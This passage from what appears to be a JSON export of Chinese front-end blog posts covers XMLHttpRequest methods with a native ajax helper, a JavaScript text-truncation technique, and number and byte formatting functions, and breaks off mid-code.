id=\"xmlhttprequest-\"\u003eXMLHttpRequest方法\u003c/h4\u003e\n\u003ch5 id=\"abort-\"\u003eabort()\u003c/h5\u003e\n\u003cp\u003e取消当前响应，关闭连接并且结束任何未决的网络活动。\u003c/p\u003e\n\u003cp\u003e这个方法把 XMLHttpRequest 对象重置为 readyState 为 0 的状态，并且取消所有未决的网络活动。例如，如果请求用了太长时间，而且响应不再必要的时候，可以调用这个方法。\u003c/p\u003e\n\u003ch5 id=\"getallresponseheaders-\"\u003egetAllResponseHeaders()\u003c/h5\u003e\n\u003cp\u003e把 HTTP 响应头部作为未解析的字符串返回。\u003c/p\u003e\n\u003cp\u003e如果 readyState 小于 3，这个方法返回 null。否则，它返回服务器发送的所有 HTTP 响应的头部。头部作为单个的字符串返回，一行一个头部。每行用换行符 \u0026quot;\\r\\n\u0026quot; 隔开。\u003c/p\u003e\n\u003ch5 id=\"getresponseheader-\"\u003egetResponseHeader()\u003c/h5\u003e\n\u003cp\u003e返回指定的 HTTP 响应头部的值。其参数是要返回的 HTTP 响应头部的名称。可以使用任何大小写来制定这个头部名字，和响应头部的比较是不区分大小写的。\u003c/p\u003e\n\u003cp\u003e该方法的返回值是指定的 HTTP 响应头部的值，如果没有接收到这个头部或者 readyState 小于 3 则为空字符串。如果接收到多个有指定名称的头部，这个头部的值被连接起来并返回，使用逗号和空格分隔开各个头部的值。\u003c/p\u003e\n\u003ch5 id=\"open-\"\u003eopen()\u003c/h5\u003e\n\u003cp\u003e初始化一个请求. 该方法用于JavaScript代码中;如果是本地代码, 使用 \u003ca href=\"https://developer.mozilla.org/zh-cn/nsIXMLHttpRequest#openRequest(\" target=\"_blank\"\u003e\u003ccode\u003eopenRequest()\u003c/code\u003e\u003c/a\u003e)方法代替.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e \u003cstrong\u003e注意:\u003c/strong\u003e 在一个已经激活的request下（已经调用open()或者openRequest()方法的request）再次调用这个方法相当于调用了abort（）方法。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e参数\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003e\u003ccode\u003emethod\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e请求所使用的HTTP方法; 例如 \u0026quot;GET\u0026quot;, \u0026quot;POST\u0026quot;, \u0026quot;PUT\u0026quot;, \u0026quot;DELETE\u0026quot;等. 如果下个参数是非HTTP(S)的URL,则忽略该参数.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003ccode\u003eurl\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e该请求所要访问的URL\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003ccode\u003easync\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e一个可选的布尔值参数，默认为true,意味着是否执行异步操作，如果值为false,则send()方法不会返回任何东西，直到接受到了服务器的返回数据。如果为值为true，一个对开发者透明的通知会发送到相关的事件监听者。这个值必须是true,如果multipart 属性是true，否则将会出现一个意外。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003ccode\u003euser\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e用户名,可选参数,为授权使用;默认参数为空string.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003ccode\u003epassword\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e密码,可选参数,为授权使用;默认参数为空string.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"send-\"\u003esend()\u003c/h5\u003e\n\u003cp\u003e发送 HTTP 请求，使用传递给 open() 方法的参数，以及传递给该方法的可选请求体。\u003c/p\u003e\n\u003ch5 id=\"setrequestheader-\"\u003esetRequestHeader()\u003c/h5\u003e\n\u003cp\u003e向一个打开但未发送的请求设置或添加一个 HTTP 请求(设置请求头)。\u003c/p\u003e\n\u003cp\u003e参数\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003e\u003ccode\u003eheader\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e将要被赋值的请求头名称\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003ccode\u003evalue\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e给指定的请求头赋的值\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"ajax-js-\"\u003eAjax原生js实现\u003c/h3\u003e\n\u003cp\u003e下面是使用原生js写的ajax：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e ajax = {};\najax.httpRequest = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e//判断是否支持XMLHttpRequest对象\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.XMLHttpRequest) {\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e XMLHttpRequest();\n    }\n    \u003cspan class=\"hljs-comment\"\u003e//兼容IE浏览器\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e versions = [\n        \u003cspan class=\"hljs-string\"\u003e\"MSXML2.XmlHttp.6.0\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"MSXML2.XmlHttp.5.0\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"MSXML2.XmlHttp.4.0\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"MSXML2.XmlHttp.3.0\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"MSXML2.XmlHttp.2.0\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"Microsoft.XmlHttp\"\u003c/span\u003e\n    ];\n    \u003cspan class=\"hljs-comment\"\u003e//定义局部变量xhr,储存IE浏览器的ActiveXObject对象\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e xhr;\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i \u0026lt; versions.length; i++) {\n        \u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e {\n            xhr = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e ActiveXObject(versions[i]);\n            \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n        } \u003cspan class=\"hljs-keyword\"\u003ecatch\u003c/span\u003e (e) {\n        }\n    }\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e xhr;\n};\n\najax.send = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eurl, callback, method, data, async\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e//默认异步\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e === \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e) {\n        \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n    }\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e httpRequest = ajax.httpRequest();\n    \u003cspan class=\"hljs-comment\"\u003e//初始化HTTP请求\u003c/span\u003e\n    httpRequest.open(method, url, \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e);\n    \u003cspan class=\"hljs-comment\"\u003e//onreadystatechange函数对象\u003c/span\u003e\n    httpRequest.onreadystatechange = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-comment\"\u003e//readyState 的值等于4，从服务器拿到了数据\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (httpRequest.readyState == \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e) {\n            \u003cspan class=\"hljs-comment\"\u003e//回调服务器响应数据\u003c/span\u003e\n            callback(httpRequest.responseText)\n        }\n    };\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (method == \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e) {\n          \u003cspan class=\"hljs-comment\"\u003e//给指定的HTTP请求头赋值\u003c/span\u003e\n        httpRequest.setRequestHeader(\u003cspan class=\"hljs-string\"\u003e'Content-type'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'application/x-www-form-urlencoded'\u003c/span\u003e);\n    }\n      \u003cspan class=\"hljs-comment\"\u003e//发送HTTP请求\u003c/span\u003e\n    httpRequest.send(data);\n};\n\u003cspan class=\"hljs-comment\"\u003e//实现GET请求\u003c/span\u003e\najax.get = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eurl, data, callback, async\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e query = [];\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e key \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e data) {\n        query.push(\u003cspan class=\"hljs-built_in\"\u003eencodeURIComponent\u003c/span\u003e(key) + \u003cspan class=\"hljs-string\"\u003e'='\u003c/span\u003e + \u003cspan class=\"hljs-built_in\"\u003eencodeURIComponent\u003c/span\u003e(data[key]));\n    }\n    ajax.send(url + (query.length ? \u003cspan class=\"hljs-string\"\u003e'?'\u003c/span\u003e + query.join(\u003cspan class=\"hljs-string\"\u003e'\u0026amp;'\u003c/span\u003e) : \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e), callback, \u003cspan class=\"hljs-string\"\u003e'GET'\u003c/span\u003e, \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e)\n};\n\u003cspan class=\"hljs-comment\"\u003e//实现POST请求\u003c/span\u003e\najax.post = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eurl, data, callback, async\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e query = [];\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e key \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e data) {\n        query.push(\u003cspan class=\"hljs-built_in\"\u003eencodeURIComponent\u003c/span\u003e(key) + \u003cspan class=\"hljs-string\"\u003e'='\u003c/span\u003e + \u003cspan class=\"hljs-built_in\"\u003eencodeURIComponent\u003c/span\u003e(data[key]));\n    }\n    ajax.send(url, callback, \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e, query.join(\u003cspan class=\"hljs-string\"\u003e'\u0026amp;'\u003c/span\u003e), \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e)\n};\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果你使用jquery或是zepto很大部分是因为它的ajax兼容性高的缘故，不妨试试这个：\u003ca href=\"https://github.com/damonare/ajax/tree/master\" target=\"_blank\"\u003edamonare的ajax库\u003c/a\u003e，喜欢给个star也是可以的。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e后记\u003c/h2\u003e\n\u003cp\u003eajax技术对于整个web应用意义都是非凡的，仅以此篇致敬那些曾经奋斗在一线为了ajax技术的实现和普及做出工作的前辈们。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e参考文章\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://www.cnblogs.com/SanMaoSpace/archive/2013/06/15/3137180.html\" target=\"_blank\"\u003eAjax工作原理记优缺点\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://zh.wikipedia.org/wiki/AJAX\" target=\"_blank\"\u003eAjax\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","buildTime":"1515060169.9527","__v":0}
{"_id":{"$oid":"5a4e188de4919b0e782b4c7f"},"id":"59704462f265da6c44077fc4","author":{"$oid":"5a4e188de4919b0e782b4c71"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/7/20/b524077c5f52787603f3150348f2407e","https://user-gold-cdn.xitu.io/2017/7/20/ea79b008978e2fd563afdf6ff248d725","https://user-gold-cdn.xitu.io/2017/7/20/527fdec0e45809279efd48dfd5b1bb28"],"screenShot":null}],"title":"文本截断知多少","meta":{"likeCount":0},"tag":["Vue.js","CSS"],"comment":[],"shortContent":"文本截断是我们前端经常会碰到的需求，有些文本比较长，设计师往往会在有限的空间内限制字符数量，以确保界面的美观性，而且会在一些字符后面加上省略号来表示截断，这个时候我们往往会使用css3的text-overflow:ellipisis来解决，单行文本截断没什么问题，多行文本我们也…","content":"\u003cp\u003e文本截断是我们前端经常会碰到的需求，有些文本比较长，设计师往往会在有限的空间内限制字符数量，以确保界面的美观性，而且会在一些字符后面加上省略号来表示截断，这个时候我们往往会使用css3的\u003cstrong\u003etext-overflow:ellipisis\u003c/strong\u003e来解决，单行文本截断没什么问题，多行文本我们也可以借助webkit的私有属性**-webkit-line-clamp**来解决。但是这是一个不规范的属性，并没有出现在CSS规范草案中，所以只能在webkit内核的浏览器下使用。今天介绍一下如何使用javascript来实现文本截断，并附上一个基于vue的文本截断组件\u003ca target=\"_blank\" href=\"https://github.com/lucefer/ellipsis-plus\"\u003eellipisis-plus\u003c/a\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e原理\u003c/h4\u003e\n\u003cp\u003e相信大家很容易就会想到如何实现，就是计算、计算、计算。不过我还是先把原理啰嗦出来，以免有些童鞋一时想不到。\n简单来说，文本截断的实现就是依赖一个简单的数学公式。\u003cstrong\u003eY*L=n*X+D\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eY代表容器宽度。✅\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e容器宽度很容易计算出来，用offsetWidth。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003eL代表显示行数。✅\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e显示行数\u001d因为是我们指定的值，所以也是已知量。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003en代表字符个数。❓\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e待求。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003eX代表字符宽度。❌\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e字符宽度，这个就不太统一了，为什么呢？首先，假定我们* 字体大小*、\u003cem\u003e字体类型\u003c/em\u003e 设置统一的情况下，浏览器对英文字母、数字、特殊符号、汉字等渲染的宽度都是不同的。即使英文字母，不同字母的宽度也是不尽相同的。所以，字符宽度我们无法确定。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003eD代表省略号占位符的宽度。✅\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e可以利用offsetWidth计算得知。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e我们要求解的是字符个数n，所以，\u003cem\u003e容器宽度、字符宽度、显示行数、省略号占位符宽度\u003c/em\u003e 这四个参数必须是确定的。千言万语抵不过一张图。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/7/20/b524077c5f52787603f3150348f2407e\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e因为字符宽度X不确定，所以单纯依赖这个公式，我们无法计算出字符个数。你也许会说了，前面你不是已经说依赖这个数学公式吗？现在又说这个公式无法计算出字符个数，这不自相矛盾吗？\u003c/p\u003e\n\u003cp\u003e是的，没错。单单依靠这个公式是无法达到我们的目的，但是我们如果想达到截断的目的，还是需要这个公式来支撑的。也就是说，这个公式是实现文本截断的一个必要条件，我们还需要其他手段，并结合这个数学公式来实现。\u003c/p\u003e\n\u003cp\u003e好吧，重新整理一下我们的思路。为了达到文本截断的目的，我们需要找到一个\u003cstrong\u003e临界字符\u003c/strong\u003e，这个字符能够刚好显示在指定行的末尾。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e临界字符是这样的一个字符，紧跟它的字符一旦添加到容器中，容器就会另起一行显示。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e那么问题来了，如何找到这个临界字符呢？聪明的你也许已经想到了，我们可以一个一个的添加字符，每添加一个字符就检查一下容器的高度是否超过指定行的高度，如下动图。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/7/20/ea79b008978e2fd563afdf6ff248d725\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e我们一个个的往容器中添加字符，每添加一个，就检查一下容器的高度是否超过指定行的高度。如果刚好超过，那么当前字符就是我们的临界字符，这个方案没问题，妥妥哒，\u003ca target=\"_blank\" href=\"http://ifanqi.me/ellipsis-plus/demo/dist/index.html#/ellipsisDemo\"\u003e演示地址\u003c/a\u003e。接下来，我们看下这个方案中的细节。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e细节\u003c/h4\u003e\n\u003cp\u003e上述方案大方向没问题，但是有些细节要注意。\u003c/p\u003e\n\u003cp\u003e\u0008**1. 性能 **\u003c/p\u003e\n\u003cp\u003e首当其冲的是性能问题，我们不难想到，在我们每次添加一个字符的时候，都要重新计算容器高度，而容器高度是通过\u003cstrong\u003eoffsetHeight\u003c/strong\u003e计算得来的，我们都知道offsetHeight一旦调用，就会强制浏览器重排（reflow），次数多了，自然会影响性能。所以我们要做点小优化。什么优化呢？我们的公式\u003cstrong\u003eY*L=n*X+D\u003c/strong\u003e派上用场了。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e我们可以假定所有字符都是中文字符，计算单个中文字符的宽度缓存起来，然后通过这个公式计算一个估值L,我们截取前L个字符，放到容器中。\u003c/li\u003e\n\u003cli\u003e判断当前容器高度是否大于指定高度。\n\u003cul\u003e\n\u003cli\u003e如果大于指定高度，说明我们的L值取大了，需要往少了减少字符去探测。\u003c/li\u003e\n\u003cli\u003e如果小于指定高度，说明我们的L值取小了，需要往多了增加字符去探测。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e通过这个手段，我们可以大大降低浏览器的重排引起的性能问题。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e2. 字符宽度的计算\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e再说下字符宽度，字符宽度并不是和字体大小等大的，字符宽度除了和语言符号有关，还和样式有关，比如font-size，letter-spacing等。所以我们在计算的时候，要将单个字符放到一个内联容器中，通过容器的offsetWidth来计算。即便我们通过offsetWidth来计算，也仍然要注意以下两点：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e首先字符的宽度不一定都是整数，也有可能是浮点数，比如英文字母，特殊符号等。\u003c/li\u003e\n\u003cli\u003e其次\u003cstrong\u003eoffsetWidth\u003c/strong\u003e会根据字符宽度\u003cstrong\u003e四舍五入来取整\u003c/strong\u003e，所以导致我们计算出来的\u003cstrong\u003e实际宽度\u003c/strong\u003e不准，这个时候我们必须向上取整，以保证字符总宽度小于等于容器宽度和行数的乘积。否则，我们的临界字符会取的不准。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e3. 容器宽度的计算\u003c/strong\u003e\n如第二条所说，offsetWidth会根据宽度四舍五入来取整，所以我们的容器宽度也未必是准的，这个时候，我们要对容器宽度向下取整，目的也是为了让字符总宽度小于等于容器宽度和行数的乘积。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e也许你会说我们可以用getComputedStyle来计算宽度，很不幸的告诉你，通过这种方式计算出的容器宽度并不总是数值，也有可能是\"auto\"。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e4. 容器每行字符所占高度的计算\u003c/strong\u003e\n容器每行字符所占高度与font-family、font-size、line-height有关，如下图所示，不同的字体，同时设置100px字体大小，line-height设置为1，字符所占空间的高度是不同的，更深层次的原因\u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/25808995?group_id=825729887779307520\"\u003e请戳这里\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/7/20/527fdec0e45809279efd48dfd5b1bb28\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e所以我们无法通过这三个要素来精确计算容器每行字符的高度。但有一个取巧的手段：为容器添加一个字符，计算容器的offsetHeight得出行高。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e总结\u003c/h4\u003e\n\u003cp\u003e由文本截断我们可以总结一些知识点：\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e1. offsetWidth获取的数值不可靠。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e2. 字符所占空间的宽度、高度和字体、字号、行高等综合影响有关。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e3. getComputedStyle计算出的宽度、行高并不总是数值。\u003c/strong\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e源码\u003c/h4\u003e\n\u003cp\u003e说了这么多理论的东西，也是时候来点源码了，我就不贴了，具体请\u003ca target=\"_blank\" href=\"https://github.com/lucefer/ellipsis-plus\"\u003e戳这里\u003c/a\u003e。查看演示请\u003ca target=\"_blank\" href=\"http://ifanqi.me/ellipsis-plus/demo/dist/index.html#/ellipsis\"\u003e戳这里\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1515043667.9768","__v":0}
{"_id":{"$oid":"5a4e188ee4919b0e782b4c84"},"id":"5a006a48f265da4321537118","author":{"$oid":"5a4e188ee4919b0e782b4c83"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"JavaScript单位换算和数字格式化","meta":{"likeCount":0},"tag":["JavaScript"],"comment":[],"shortContent":"最近发现自己日常工作中，经常会遇到对需要对后端传过来的一些数据进行显示处理，比如说时间、数值、字符串、数字等等。所以决定归纳在一起，便于查阅和参考。 1. 数字三分位格式化 较大的数字为了便于阅读，一般都需要做三分位格式化处理。 例如：12345需要显示为12,345。 还有一…","content":"\u003cp\u003e最近发现自己日常工作中，经常会遇到对需要对后端传过来的一些数据进行显示处理，比如说时间、数值、字符串、数字等等。所以决定归纳在一起，便于查阅和参考。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e格式化常用插件：\u003ca href=\"http://numbrojs.com/\"\u003enumbro.js\u003c/a\u003e\u003cbr\u003e数据处理一般用：\u003ca href=\"http://lodash.think2011.net/\"\u003elodash.js\u003c/a\u003e、 \u003ca href=\"http://www.bootcss.com/p/underscore/\"\u003eunderscore.js\u003c/a\u003e\u003cbr\u003e时间处理是大家都知道的:\u003ca href=\"http://momentjs.cn/\"\u003emoment.js\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e1. 数字三分位格式化\u003c/h3\u003e\u003cp\u003e较大的数字为了便于阅读，一般都需要做三分位格式化处理。\u003cbr\u003e例如：12345需要显示为12,345。\u003cbr\u003e最经典的是使用正则\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eformatNumber\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003evalue\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e value.toString().replace(\u003cspan class=\"hljs-regexp\"\u003e/(\\d)(?=(\\d{3})+(?!\\d))/g\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'$1'\u003c/span\u003e + \u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e)\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e还有一种较为简单的方法,但对于IE edge之前的版本，Number.toLocaleString()会自动补上两位小数，如果是不需要的，需要自己额外过滤掉。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascrip\" lang=\"javascrip\"\u003eNumber.toLocaleString('en-US');\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e2. Bytes字节换算\u003c/h3\u003e\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eformatBytes\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ea, b\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e == a) \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'0 Bytes'\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e c = \u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e,\n  d = b || \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e,\n  e = [\u003cspan class=\"hljs-string\"\u003e'Bytes'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'KB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'MB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'GB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'TB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'PB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'EB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'ZB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'YB'\u003c/span\u003e],\n  f = \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.floor(\u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.log(a) / \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.log(c));\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eparseFloat\u003c/span\u003e((a / \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.pow(c, f)).toFixed(d)) + \u003cspan class=\"hljs-string\"\u003e' '\u003c/span\u003e + e[f]\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e后来参考了一些资料，觉得下面的方法更好\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eformatByte\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003evalue,fixed\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e binarySuffixes = [\u003cspan class=\"hljs-string\"\u003e'B'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'KB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'MB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'GB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'TB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'PB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'EB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'ZB'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'YB'\u003c/span\u003e]\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e val = +value\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e power,min,max,suffix=binarySuffixes[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(isNumber(val)){\n    